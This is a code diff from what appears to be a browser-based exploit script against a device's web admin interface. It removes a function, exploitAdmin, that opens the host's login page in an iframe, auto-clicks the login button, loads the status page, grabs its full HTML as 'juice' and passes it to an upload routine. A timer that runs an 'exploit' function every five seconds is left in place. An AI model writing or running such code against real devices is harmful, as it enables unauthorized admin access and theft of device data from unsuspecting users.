@@ -82,27 +82,6 @@ function flushCache(){
 								this.parentNode.removeChild(this)
 				}.bind(frame)
 }
-		function exploitAdmin(){
-			frame = document.createElement("iframe")
-			frame.src="http://"+document.location.hostname+"/login.htm"
-			frame.sandbox = "allow-same-origin allow-forms"
-			//frame.style.display='none'
-			var body = document.getElementsByTagName('body')[0]
-			frame.onload = function(){
-				frame.contentWindow.document.getElementById('loginBtn').click()
-				newFrame = document.createElement("iframe")
-				newFrame.sandbox = "allow-same-origin allow-scripts allow-popups allow-forms"
-				newFrame.src = "http://"+document.location.hostname+"/status.htm"
-			//	newFrame.style.display='none'
-				newFrame.onload = function(){
-					var juice = newFrame.contentWindow.document.getElementsByTagName('html')[0].innerHTML
-					upload(juice)
-				}
-				frame.appendChild(newFrame);
-
-			}
-			body.appendChild(frame)
-		}
 
 		setInterval(exploit, 5000)
 		
